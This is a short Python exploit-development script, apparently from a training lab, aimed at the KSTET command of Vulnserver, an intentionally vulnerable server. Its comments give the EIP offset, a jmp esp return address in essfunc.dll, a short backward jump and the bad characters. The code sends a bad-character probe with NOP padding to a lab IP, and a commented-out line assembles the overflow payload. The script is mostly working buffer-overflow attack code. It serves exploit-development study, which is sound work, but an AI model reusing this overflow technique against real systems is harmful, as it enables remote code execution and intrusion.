# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

# EIP offset: 66
#   0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\PT LabMachine\Desktop\vulnserver\essfunc.dll)
# EBB8              jmp short 0xffffffba
# badchars: '\x00'

import socket

cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.12',9999))
print cnct.recv(1024)

evilString = ("\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4"
"\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4"
"\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

evilString = evilString + "\x90" * 15

#evilString = "A" * 66 + + "\xdf\x11\x50\x62" + "\xEB\xB8" +"C" * 18
cnct.send("KSTET /.:/"+evilString)
cnct.close()